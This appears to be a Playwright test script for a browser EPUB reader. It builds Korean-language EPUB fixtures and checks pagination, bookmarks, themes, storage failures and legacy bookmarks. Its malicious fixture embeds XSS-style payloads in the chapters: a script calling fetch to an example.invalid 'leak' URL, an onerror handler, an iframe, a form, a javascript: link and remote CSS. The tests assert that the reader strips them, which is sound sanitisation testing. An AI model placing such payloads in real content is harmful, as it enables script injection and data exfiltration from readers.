"""Real Chromium tests using generated EPUBs; no real book or production data.

Usage: python browser_reader.py --url http://127.0.0.1:18122/
Requires Playwright and Chromium. Starts with isolated browser storage.
"""
import argparse
import io
import json
import zipfile
from pathlib import Path
from playwright.sync_api import sync_playwright, expect


from functools import lru_cache

@lru_cache
def fixture(version=3, malicious=False):
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('mimetype', 'application/epub+zip')
        z.writestr('META-INF/container.xml', '<?xml version="1.0"?><container xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OPS/package.opf" media-type="application/oebps-package+xml"/></rootfiles></container>')
        navigation = '<item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>' if version == 3 else '<item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>'
        z.writestr('OPS/package.opf', f'''<package xmlns="http://www.idpf.org/2007/opf" version="{version}.0" unique-identifier="uid"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="uid">fixture-{version}-{malicious}</dc:identifier><dc:title>테스트 산책 {version}</dc:title><dc:creator>책자리 작가</dc:creator><meta name="cover" content="cover"/></metadata><manifest><item id="one" href="text/ch1.xhtml" media-type="application/xhtml+xml"/><item id="two" href="text/ch2.xhtml" media-type="application/xhtml+xml"/>{navigation}<item id="cover" href="images/cover.svg" media-type="image/svg+xml" properties="cover-image"/></manifest><spine toc="ncx"><itemref idref="one"/><itemref idref="two"/></spine></package>''')
        z.writestr('OPS/nav.xhtml', '<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><body><nav epub:type="toc"><ol><li><a href="text/ch1.xhtml">첫 번째 산책</a></li><li><a href="text/ch2.xhtml#destination">두 번째 산책</a></li></ol></nav></body></html>')
        z.writestr('OPS/toc.ncx', '<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/"><navMap><navPoint id="a"><navLabel><text>첫 번째 산책</text></navLabel><content src="text/ch1.xhtml"/></navPoint><navPoint id="b"><navLabel><text>두 번째 산책</text></navLabel><content src="text/ch2.xhtml#destination"/></navPoint></navMap></ncx>')
        z.writestr('OPS/images/cover.svg', '<svg xmlns="http://www.w3.org/2000/svg" width="180" height="240"><rect width="180" height="240" fill="#315e49"/><text x="20" y="80" fill="white" font-size="20">책자리 산책</text></svg>')
        for chapter in (1,2):
            evil = '''<script>parent.__epubAttack = true; fetch('https://example.invalid/leak')</script><img src="https://example.invalid/pixel" onerror="parent.__epubAttack=true"/><iframe src="https://example.invalid/embed"></iframe><form action="https://example.invalid"><input value="leak"/></form><a href="javascript:parent.__epubAttack=true">나쁜 링크</a><style>body{background:url(https://example.invalid/css)}</style>''' if malicious else ''
            paragraphs = ''.join(f'<p id="p{chapter}-{i}">{chapter}장 문단 {i}. 바람이 부는 오후, 조용한 책장 사이를 걸었습니다. 읽던 문장을 기억하고 다음 날에도 같은 자리에서 이야기를 이어갑니다. ' + '책 속의 길을 천천히 따라갑니다. ' * 8 + '</p>' for i in range(45))
            z.writestr(f'OPS/text/ch{chapter}.xhtml', f'''<html xmlns="http://www.w3.org/1999/xhtml"><head><title>산책</title></head><body><h1 id="destination">{chapter}장 산책</h1><svg xmlns="http://www.w3.org/2000/svg"><image href="../images/cover.svg" width="180" height="240"/></svg>{evil}{paragraphs}<a href="ch2.xhtml#p2-10">다른 장의 문단으로 이동</a></body></html>''')
    return stream.getvalue()


def assert_bookmark_visible(page):
    assert page.evaluate("""async () => {
      const db=await new Promise(resolve=>{const r=indexedDB.open('bookjari-poc12');r.onsuccess=()=>resolve(r.result)});
      const books=await new Promise(resolve=>{const r=db.transaction('books').objectStore('books').getAll();r.onsuccess=()=>resolve(r.result)});
      const pos=books.find(b=>b.bookmarks.length).bookmarks[0].position;
      const f=document.querySelector('#book-frame'),d=f.contentDocument;
      const block=[...d.querySelectorAll('[data-reader-block]')].find(e=>e.dataset.readerBlock===pos.block);
      const walker=d.createTreeWalker(block,NodeFilter.SHOW_TEXT);let node,offset=pos.textOffset || 0;
      while(node=walker.nextNode()) { if(offset<node.length) {const r=d.createRange();r.setStart(node,offset);r.setEnd(node,offset+1);const box=r.getBoundingClientRect();return box.left>=-1&&box.right<=f.clientWidth+1&&box.top>=-1&&box.bottom<=f.clientHeight+1;} offset-=node.length; }
      return false;
    }"""), 'Bookmarked text must remain on the visible spread'


def check(page, url, mobile=False):
    errors, external = [], []
    page.on('pageerror', lambda e: errors.append(str(e)))
    page.on('request', lambda r: external.append(r.url) if r.url.startswith('https://example.invalid') else None)
    page.goto(url)
    expect(page.locator('#empty')).to_be_visible()
    page.locator('#file-input').set_input_files({'name':'산책.epub','mimeType':'application/epub+zip','buffer':fixture(malicious=True)})
    expect(page.locator('#reader')).to_be_visible()
    expect(page.locator('#save-status')).to_have_text('이 브라우저에 읽던 위치 저장됨')
    frame = page.frame_locator('#book-frame')
    expect(frame.locator('h1')).to_have_text('1장 산책')
    assert frame.locator('img').count() == 1
    assert frame.locator('script,form,iframe,style:not(#reader-style)').count() == 0
    assert page.evaluate('window.__epubAttack') is None
    assert external == [], external
    expect(page.locator('#book-frame')).to_have_attribute('data-columns','2')
    initial_page = int(page.locator('#book-frame').get_attribute('data-page'))
    assert initial_page == 1
    assert int(page.locator('#book-frame').get_attribute('data-pages')) > 4
    page.locator('#next-page').click()
    expect(page.locator('#book-frame')).to_have_attribute('data-page','3')
    page.locator('#next-page').click()
    expect(page.locator('#book-frame')).to_have_attribute('data-page','5')
    # There is distinct, visible text on both facing pages, with no vertical scrolling.
    assert page.evaluate("""() => {
      const f=document.querySelector('#book-frame'),d=f.contentDocument,w=f.clientWidth;
      const r=d.createRange();r.selectNodeContents(d.body.firstElementChild);
      const rects=[...r.getClientRects()].filter(r=>r.width>0&&r.height>0&&r.top>=0&&r.bottom<=f.clientHeight);
      return rects.some(r=>r.left>=0&&r.right<w/2)&&rects.some(r=>r.left>w/2&&r.right<=w)&&d.documentElement.scrollHeight<=f.clientHeight+1;
    }""")
    page.locator('#add-bookmark').click()
    expect(page.locator('#status')).to_have_text('책갈피를 저장했습니다.')
    page.locator('#toggle-sidebar').click();page.locator('#marks-tab').click()
    expect(page.locator('.bookmark-item')).to_have_count(1)
    label = page.locator('.bookmark-go strong').inner_text()
    assert label
    page.locator('#add-bookmark').click();expect(page.locator('.bookmark-item')).to_have_count(1)
    page.reload()
    expect(frame.locator('h1')).to_have_text('1장 산책')
    expect(page.locator('#save-status')).to_have_text('이 브라우저에 읽던 위치 저장됨')
    expect(page.locator('#book-frame')).to_have_attribute('data-page','5')
    page.locator('#toggle-sidebar').click();page.locator('#toc-tab').click();page.locator('.toc-item').nth(1).click()
    expect(frame.locator('h1')).to_have_text('2장 산책')
    expect(page.locator('#next-page')).to_be_enabled()
    expect(page.locator('#book-frame')).to_have_attribute('data-page','1')
    page.locator('#prev-page').click()
    expect(frame.locator('h1')).to_have_text('1장 산책')
    expect(page.locator('#add-bookmark')).to_be_enabled()
    last = int(page.locator('#book-frame').get_attribute('data-pages'))
    assert int(page.locator('#book-frame').get_attribute('data-page')) == ((last-1)//2)*2+1
    page.locator('#next-page').click();expect(frame.locator('h1')).to_have_text('2장 산책')
    expect(page.locator('#add-bookmark')).to_be_enabled()
    if page.locator('#sidebar').is_hidden(): page.locator('#toggle-sidebar').click()
    page.locator('#marks-tab').click();page.locator('.bookmark-go').click()
    expect(frame.locator('h1')).to_have_text('1장 산책')
    expect(page.locator('#book-frame')).to_have_attribute('data-page','5')
    expect(page.locator('#add-bookmark')).to_be_enabled()
    if not page.locator('#sidebar').is_hidden(): page.locator('#toggle-sidebar').click()
    page.locator('#font-plus').click();expect(page.locator('#font-size')).to_have_text('20')
    page.locator('#theme').select_option('dark')
    assert page.evaluate("document.documentElement.dataset.theme") == 'dark'
    assert_bookmark_visible(page)
    page.locator('#page-layout').select_option('1')
    expect(page.locator('#book-frame')).to_have_attribute('data-columns','1')
    assert_bookmark_visible(page)
    page.locator('#page-layout').select_option('2')
    expect(page.locator('#book-frame')).to_have_attribute('data-columns','2')
    assert_bookmark_visible(page)
    # Compact controls leave almost the entire viewport to the actual book.
    assert page.locator('.reader-toolbar').bounding_box()['height'] <= 48
    assert page.locator('#book-frame').bounding_box()['height'] >= page.viewport_size['height'] - 82
    page.screenshot(path=f'/tmp/poc12-spread-{"mobile" if mobile else "desktop"}.png')
    page.locator('#back-library').click();expect(page.locator('#library')).to_be_visible();expect(page.locator('#import-top')).to_be_enabled();expect(page.locator('.book-card')).to_have_count(1)
    expect(page.locator('#library')).to_be_visible()
    page.locator('#file-input').set_input_files({'name':'same.epub','mimeType':'application/epub+zip','buffer':fixture(malicious=True)})
    expect(page.locator('#reader')).to_be_visible();expect(page.locator('#add-bookmark')).to_be_enabled()
    expect(page.locator('#mark-count')).to_have_text('1')
    if page.locator('#sidebar').is_hidden(): page.locator('#toggle-sidebar').click()
    page.locator('#marks-tab').click();page.locator('.bookmark-delete').click()
    expect(page.locator('.bookmark-item')).to_have_count(0)
    page.locator('#back-library').click();expect(page.locator('#library')).to_be_visible();expect(page.locator('#import-top')).to_be_enabled()
    page.locator('#file-input').set_input_files({'name':'broken.epub','mimeType':'application/epub+zip','buffer':b'not a zip'})
    expect(page.locator('#status')).to_contain_text('유효한 EPUB')
    expect(page.locator('.book-card')).to_have_count(1)
    page.locator('#file-input').set_input_files({'name':'epub2.epub','mimeType':'application/epub+zip','buffer':fixture(2)})
    expect(frame.locator('h1')).to_have_text('1장 산책');expect(page.locator('#add-bookmark')).to_be_enabled()
    if page.locator('#sidebar').is_hidden(): page.locator('#toggle-sidebar').click()
    page.locator('#toc-tab').click();expect(page.locator('.toc-item')).to_have_count(2)
    page.locator('.toc-item').nth(1).click();expect(frame.locator('h1')).to_have_text('2장 산책')
    expect(page.locator('#add-bookmark')).to_be_enabled()
    assert page.evaluate('document.documentElement.scrollWidth <= innerWidth + 1')
    page.screenshot(path=f'/tmp/poc12-reader-{"mobile" if mobile else "desktop"}.png')
    page.locator('#back-library').click();expect(page.locator('#library')).to_be_visible();expect(page.locator('#import-top')).to_be_enabled();expect(page.locator('.book-card')).to_have_count(2)
    page.locator('#search').fill('테스트 산책 2');expect(page.locator('.book-card')).to_have_count(1)
    page.locator('.book-actions button').click();page.locator('#delete-cancel').click();expect(page.locator('.book-card')).to_have_count(1)
    page.locator('.book-actions button').click();page.locator('#delete-confirm').click();expect(page.locator('.book-card')).to_have_count(0)
    page.locator('#search').fill('');expect(page.locator('.book-card')).to_have_count(1)
    page.reload();expect(page.locator('.book-card')).to_have_count(1)
    expect(page.locator('#theme')).to_have_value('dark')
    assert page.evaluate('document.documentElement.scrollWidth <= innerWidth + 1')
    assert not errors, errors
    assert not external, external
    return {'mobile':mobile,'epub2_3':True,'image':True,'two_facing_pages':True,'compact_toolbar':True,'chapter_boundaries':True,'position_reload':True,'bookmark_jump_delete':True,'font_theme':True,'duplicate':True,'invalid_file':True,'delete_persisted':True,'external_requests':external,'page_errors':errors}


def check_storage_failure(browser, url):
    context=browser.new_context()
    page=context.new_page();page.goto(url)
    expect(page.locator('#empty')).to_be_visible()
    page.evaluate("""() => {
      window.originalPut = IDBObjectStore.prototype.put;
      IDBObjectStore.prototype.put = function(...args) {
        if (this.name === 'books') throw new DOMException('test quota', 'QuotaExceededError');
        return window.originalPut.apply(this, args);
      };
    }""")
    page.locator('#file-input').set_input_files({'name':'quota.epub','mimeType':'application/epub+zip','buffer':fixture()})
    expect(page.locator('#status')).to_contain_text('저장 공간이 부족')
    expect(page.locator('.book-card')).to_have_count(0)
    count=page.evaluate("""async () => {
      const db = await new Promise(resolve => {const r=indexedDB.open('bookjari-poc12');r.onsuccess=()=>resolve(r.result)});
      return new Promise(resolve => {const r=db.transaction('files').objectStore('files').count();r.onsuccess=()=>resolve(r.result)});
    }""")
    assert count == 0, 'Failed import must roll back its original file too'
    page.evaluate('() => { IDBObjectStore.prototype.put = window.originalPut; }')
    page.locator('#file-input').set_input_files({'name':'quota.epub','mimeType':'application/epub+zip','buffer':fixture()})
    expect(page.locator('#reader')).to_be_visible();expect(page.locator('#add-bookmark')).to_be_enabled()
    page.evaluate("""() => {
      IDBObjectStore.prototype.put = function(...args) {
        if (this.name === 'books') throw new DOMException('test quota', 'QuotaExceededError');
        return window.originalPut.apply(this, args);
      };
    }""")
    page.locator('#add-bookmark').click();expect(page.locator('#status')).to_contain_text('로컬 저장을 완료하지 못했습니다')
    expect(page.locator('#mark-count')).to_have_text('0')
    page.reload();expect(page.locator('#reader')).to_be_visible();expect(page.locator('#add-bookmark')).to_be_enabled()
    expect(page.locator('#mark-count')).to_have_text('0')
    context.close()
    return {'quota_failure_reported': True, 'failed_import_atomic': True, 'failed_bookmark_rollback': True}


def check_legacy_resize(browser, url):
    context=browser.new_context(viewport={'width':1440,'height':1000});page=context.new_page();page.goto(url)
    page.locator('#file-input').set_input_files({'name':'legacy.epub','mimeType':'application/epub+zip','buffer':fixture()})
    expect(page.locator('#reader')).to_be_visible();expect(page.locator('#add-bookmark')).to_be_enabled()
    page.locator('#back-library').click();expect(page.locator('#library')).to_be_visible();expect(page.locator('#import-top')).to_be_enabled()
    page.evaluate("""async () => {
      const db=await new Promise(r=>{const q=indexedDB.open('bookjari-poc12');q.onsuccess=()=>r(q.result)});
      const books=await new Promise(r=>{const q=db.transaction('books').objectStore('books').getAll();q.onsuccess=()=>r(q.result)});
      const book=books[0];book.position={chapter:0,block:'17',offset:0,ratio:.3};
      book.bookmarks=[{id:'legacy',position:book.position,label:'기존 책갈피',createdAt:Date.now()}];
      await new Promise((r,j)=>{const tx=db.transaction(['books','settings'],'readwrite');tx.objectStore('books').put(book);tx.objectStore('settings').put(book.id,'lastBook');tx.oncomplete=r;tx.onerror=j});
    }""")
    page.reload();expect(page.locator('#reader')).to_be_visible();expect(page.locator('#add-bookmark')).to_be_enabled()
    assert_bookmark_visible(page)
    for viewport in [{'width':960,'height':720},{'width':1440,'height':1000}]:
        page.set_viewport_size(viewport);page.wait_for_timeout(150);assert_bookmark_visible(page)
    before=int(page.locator('#book-frame').get_attribute('data-page'))
    page.locator('body').press('ArrowRight');expect(page.locator('#book-frame')).to_have_attribute('data-page',str(before+2))
    page.locator('body').press('ArrowLeft');expect(page.locator('#book-frame')).to_have_attribute('data-page',str(before))
    page.locator('#book-frame').hover();page.mouse.wheel(0,120)
    expect(page.locator('#book-frame')).to_have_attribute('data-page',str(before+2))
    for _ in range(60):
        if page.locator('#next-page').is_disabled(): break
        page.locator('#next-page').click();expect(page.locator('#add-bookmark')).to_be_enabled()
    expect(page.locator('#next-page')).to_be_disabled()
    expect(page.frame_locator('#book-frame').locator('h1')).to_have_text('2장 산책')
    assert int(page.locator('#book-frame').get_attribute('data-pages')) - int(page.locator('#book-frame').get_attribute('data-page')) < 2
    context.close()
    return {'legacy_bookmarks':True,'resize_anchor':True,'keyboard_and_wheel':True,'last_page_boundary':True}


def main():
    parser=argparse.ArgumentParser();parser.add_argument('--url',default='http://127.0.0.1:18122/');args=parser.parse_args()
    with sync_playwright() as p:
        browser=p.chromium.launch(executable_path='/home/ubuntu/.cache/ms-playwright/chromium-1248/chrome-linux64/chrome',args=['--no-sandbox'])
        results=[]
        for mobile in [False,True]:
            context=browser.new_context(viewport={'width':390 if mobile else 1440,'height':844 if mobile else 1000})
            results.append(check(context.new_page(),args.url,mobile));context.close()
        results.append(check_storage_failure(browser,args.url))
        results.append(check_legacy_resize(browser,args.url))
        browser.close()
        print(json.dumps(results,ensure_ascii=False,indent=2))
if __name__=='__main__':main()
